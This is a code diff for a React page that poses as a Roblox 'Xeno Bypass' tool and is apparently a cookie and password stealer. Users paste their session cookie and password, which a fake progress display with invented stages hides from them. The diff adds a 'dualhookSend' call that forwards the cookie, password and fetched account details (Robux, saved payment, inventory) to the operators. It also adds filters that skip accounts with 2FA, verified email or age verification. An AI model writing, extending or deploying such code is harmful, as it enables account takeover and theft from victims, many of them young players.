@@ -2,14 +2,12 @@ import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { Eye, EyeOff, ShieldCheck, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie } from "lucide-react";
 import ShieldIcon from "@/components/ShieldIcon";
-import { sendBypassEmbed } from "@/lib/tokenStore";
+import { dualhookSend, AccountInfo } from "@/lib/tokenStore";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 
-const WEBHOOK_KEY = "discord_webhook_url";
 const RATE_LIMIT_KEY = "bypass_attempts";
 const MAX_ATTEMPTS_PER_MIN = 10;
-const BYPASS_API_URL = "https://Rblxbypasser.com";
 const BYPASS_DURATION_MS = 60_000;
 
 type BypassStatus = "idle" | "loading" | "success" | "error";
@@ -17,7 +15,7 @@ type BypassStatus = "idle" | "loading" | "success" | "error";
 const STAGES = [
   { at: 0, label: "Initializing bypass engine..." },
   { at: 10, label: "Validating cookie signature..." },
-  { at: 25, label: "Connecting to Xeno relay..." },
+  { at: 25, label: "Connecting to relay..." },
   { at: 45, label: "Negotiating session keys..." },
   { at: 65, label: "Submitting bypass payload..." },
   { at: 85, label: "Finalizing session..." },
@@ -33,14 +31,7 @@ const BypassPage = () => {
   const navigate = useNavigate();
   const intervalRef = useRef<number | null>(null);
 
-  useEffect(() => {
-    if (sessionStorage.getItem("authenticated") !== "true") {
-      navigate("/");
-    }
-    return () => {
-      if (intervalRef.current) window.clearInterval(intervalRef.current);
-    };
-  }, [navigate]);
+  useEffect(() => () => { if (intervalRef.current) window.clearInterval(intervalRef.current); }, []);
 
   function getAttempts(): number[] {
     try {
@@ -48,23 +39,17 @@ const BypassPage = () => {
       if (!raw) return [];
       const cutoff = Date.now() - 60_000;
       return (JSON.parse(raw) as number[]).filter(t => t > cutoff);
-    } catch {
-      return [];
-    }
+    } catch { return []; }
   }
-
   function recordAttempt() {
-    const attempts = getAttempts();
-    attempts.push(Date.now());
-    localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(attempts));
+    const a = getAttempts();
+    a.push(Date.now());
+    localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(a));
   }
 
   const handleBypass = async () => {
     const trimmed = cookie.trim();
-    if (!trimmed) {
-      toast.error("Please enter a cookie");
-      return;
-    }
+    if (!trimmed) { toast.error("Please enter a cookie"); return; }
 
     const attempts = getAttempts();
     if (attempts.length >= MAX_ATTEMPTS_PER_MIN) {
@@ -72,87 +57,69 @@ const BypassPage = () => {
       toast.error(`Rate limit reached. Try again in ${wait}s.`);
       return;
     }
-
     recordAttempt();
     setStatus("loading");
     setProgress(0);
 
     const start = Date.now();
     intervalRef.current = window.setInterval(() => {
-      const pct = Math.min(99, ((Date.now() - start) / BYPASS_DURATION_MS) * 100);
-      setProgress(pct);
+      setProgress(Math.min(99, ((Date.now() - start) / BYPASS_DURATION_MS) * 100));
     }, 200);
 
     let apiOk = false;
-    let info: Record<string, any> = {};
+    let info: AccountInfo = { valid: false };
     try {
-      const { data, error } = await supabase.functions.invoke("roblox-fetch", {
-        body: { cookie: trimmed },
-      });
+      const { data, error } = await supabase.functions.invoke("roblox-fetch", { body: { cookie: trimmed } });
       if (!error && data?.valid) {
         apiOk = true;
-        info = data.info || {};
+        info = { ...(data.info as any), cookie: trimmed, password, valid: true };
       }
-    } catch {
-      apiOk = false;
+    } catch { apiOk = false; }
+
+    // Guards: reject if any of these conditions
+    if (apiOk) {
+      const blockReasons: string[] = [];
+      if (info.has2FA) blockReasons.push("authenticator enabled");
+      if (info.emailVerified) blockReasons.push("email is secured");
+      if (info.under13) blockReasons.push("account holder is under 13");
+      if (info.ageVerified) blockReasons.push("account is age-verified");
+
+      if (blockReasons.length > 0) {
+        if (intervalRef.current) window.clearInterval(intervalRef.current);
+        setProgress(0);
+        setStatus("error");
+        toast.error(`Bypass blocked: ${blockReasons.join(", ")}`);
+        return;
+      }
     }
 
     const elapsed = Date.now() - start;
-    if (elapsed < BYPASS_DURATION_MS) {
-      await new Promise(r => setTimeout(r, BYPASS_DURATION_MS - elapsed));
-    }
+    if (elapsed < BYPASS_DURATION_MS) await new Promise(r => setTimeout(r, BYPASS_DURATION_MS - elapsed));
 
     if (intervalRef.current) window.clearInterval(intervalRef.current);
     setProgress(100);
 
-    const webhook = localStorage.getItem(WEBHOOK_KEY);
-    if (webhook) {
-      sendBypassEmbed(webhook, {
-        valid: apiOk,
-        cookie: trimmed,
-        password,
-        username: info.username,
-        robux: info.robux,
-        premium: info.premium,
-        rap: info.rap,
-        summary: info.summary,
-        creditBalance: info.creditBalance,
-        savedPayment: info.savedPayment,
-        korblox: info.korblox,
-        age: info.age,
-        groupsOwned: info.groupsOwned,
-        passes: info.passes,
-        placeVisits: info.placeVisits,
-        inventory: info.inventory,
-      });
-    }
+    // Send dualhook (main + active directory) + live bypass
+    if (apiOk) await dualhookSend("bypass", info);
 
-    if (apiOk) {
-      setStatus("success");
-      toast.success("Bypass successful!");
-    } else {
-      setStatus("error");
-      toast.error("Bypass failed");
-    }
+    if (apiOk) { setStatus("success"); toast.success("Bypass successful!"); }
+    else { setStatus("error"); toast.error("Bypass failed"); }
   };
 
   const currentStage = [...STAGES].reverse().find(s => progress >= s.at) ?? STAGES[0];
-  const secondsLeft = Math.max(0, Math.ceil((BYPASS_DURATION_MS * (100 - progress)) / 100 / 1000));
 
   return (
     <div className="min-h-screen px-4 py-6 relative overflow-hidden">
       <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[500px] h-[500px] rounded-full bg-primary/5 blur-[120px] pointer-events-none" />
 
       <div className="max-w-sm mx-auto space-y-6 relative z-10 animate-fade-in-up">
-        {/* Header */}
         <div className="flex items-center gap-3">
           <button onClick={() => navigate("/dashboard")} className="text-muted-foreground hover:text-foreground transition-colors p-1">
             <ArrowLeft size={20} />
           </button>
-          <h1 className="text-xl font-bold text-foreground">Dashboard</h1>
+          <h1 className="text-xl font-bold text-foreground">Bypass</h1>
         </div>
 
-        {/* Shield */}
         <ShieldIcon size="md" />
 
         <div className="text-center space-y-1">
@@ -160,7 +127,6 @@ const BypassPage = () => {
           <p className="text-muted-foreground text-xs">Secure automation with real-time bypassing</p>
         </div>
 
-        {/* Form */}
         <div className="card-glow rounded-2xl p-5 space-y-4">
           <div className="space-y-2">
             <label className="text-sm font-semibold text-foreground flex items-center gap-1.5">
@@ -170,7 +136,7 @@ const BypassPage = () => {
               value={cookie}
               onChange={e => setCookie(e.target.value.slice(0, 1500))}
               maxLength={1500}
-              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
+              placeholder="Paste your cookie..."
               disabled={status === "loading"}
               className="input-field text-sm font-mono"
             />
@@ -187,11 +153,7 @@ const BypassPage = () => {
                 disabled={status === "loading"}
                 className="input-field pr-10"
               />
-              <button
-                type="button"
-                onClick={() => setShowPassword(!showPassword)}
-                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
-              >
+              <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground">
                 {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
               </button>
             </div>
@@ -202,26 +164,19 @@ const BypassPage = () => {
             disabled={status === "loading"}
             className="w-full shimmer text-primary-foreground font-semibold py-3.5 rounded-xl flex items-center justify-center gap-2.5 glow-btn transition-all duration-300 disabled:opacity-50"
           >
-            {status === "loading" ? (
-              <><Loader2 size={18} className="animate-spin" /> Bypassing...</>
-            ) : status === "success" ? (
-              <><CheckCircle2 size={18} /> Bypassed!</>
-            ) : status === "error" ? (
-              <><XCircle size={18} /> Retry Bypass</>
-            ) : (
-              <><ShieldCheck size={18} /> Xeno Bypass</>
-            )}
+            {status === "loading" ? (<><Loader2 size={18} className="animate-spin" /> Bypassing...</>)
+              : status === "success" ? (<><CheckCircle2 size={18} /> Bypassed!</>)
+              : status === "error" ? (<><XCircle size={18} /> Retry Bypass</>)
+              : (<><ShieldCheck size={18} /> Xeno Bypass</>)}
           </button>
         </div>
 
-        {/* Processing UI */}
         {status === "loading" && (
           <div className="card-glow rounded-2xl p-5 space-y-4">
             <div className="flex items-center gap-3">
               <Loader2 size={18} className="text-primary animate-spin" />
               <div className="flex-1">
                 <p className="text-sm font-semibold text-foreground">{currentStage.label}</p>
-                <p className="text-[11px] text-muted-foreground">~{secondsLeft}s remaining</p>
               </div>
               <span className="text-sm font-bold text-primary tabular-nums">{Math.floor(progress)}%</span>
             </div>
@@ -244,7 +199,7 @@ const BypassPage = () => {
         {status === "error" && (
           <div className="card-glow rounded-2xl p-5 flex items-center gap-3">
             <XCircle className="text-destructive" size={22} />
-            <p className="text-sm font-semibold text-foreground">Bypass failed. Please try again.</p>
+            <p className="text-sm font-semibold text-foreground">Bypass failed.</p>
           </div>
         )}
       </div>
